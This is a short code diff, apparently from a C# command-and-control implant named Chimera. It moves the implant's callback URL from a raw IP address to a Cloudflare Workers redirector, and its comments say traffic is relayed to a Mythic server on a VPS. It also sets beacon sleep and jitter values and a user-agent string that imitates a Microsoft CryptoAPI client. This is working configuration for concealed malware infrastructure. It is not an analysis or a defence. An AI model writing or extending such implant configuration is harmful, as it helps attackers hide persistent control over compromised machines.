@@ -4,7 +4,9 @@ namespace Chimera
     // Do not edit manually — values are injected at payload creation time.
     public static class Config
     {
-        public static string CallbackURL     = "http://144-172-84-23.nip.io:80/api/v1/update/check";
+        // POST goes through Cloudflare worker → Mythic on VPS port 80
+        // post_uri in Mythic HTTP profile = "data"  →  full path = /data
+        public static string CallbackURL     = "https://hidden-lake-0908.walrus012.workers.dev/data";
         public static int    SleepInterval   = 10;   // seconds
         public static int    Jitter          = 30;   // % of SleepInterval
         public static string UserAgent       = "Microsoft-CryptoAPI/10.0";
